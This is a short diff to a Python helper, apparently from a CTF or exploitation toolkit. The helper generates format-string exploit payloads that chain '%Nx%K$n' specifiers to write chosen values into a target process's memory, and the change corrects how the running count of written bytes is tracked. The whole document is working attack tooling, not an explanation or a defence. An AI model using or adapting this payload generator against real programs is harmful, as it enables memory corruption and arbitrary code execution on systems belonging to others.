@@ -4,6 +4,7 @@ import os
 def fsb(width, offset, data, padding, roop):
 	payload = ""
 	write_num = 0 
+	write_all = 0
 	s = "$n"
 	mask = 0xffffffff
 	if width == 1:
@@ -17,14 +18,15 @@ def fsb(width, offset, data, padding, roop):
 		mask = 0xffffffff
 	
 	for i in range(0, roop):
-		write_num = (((data >> (i*8*width)) & mask) - write_num - padding)
-		if write_num < 0:
-			write_num += (1 << width*8)
+		write_num = ((((data >> (i*8*width)) & mask) + (1 << width*8)) - (write_all & mask) - padding)
+		if write_num > (1 << width*8):
+			write_num -= (1 << width*8) 
 		payload += "%"
 		payload += str(write_num)
 		payload += "x%"
 		payload += str(offset+i)
 		payload += s
+		write_all += write_num 
 		
 	return payload
 
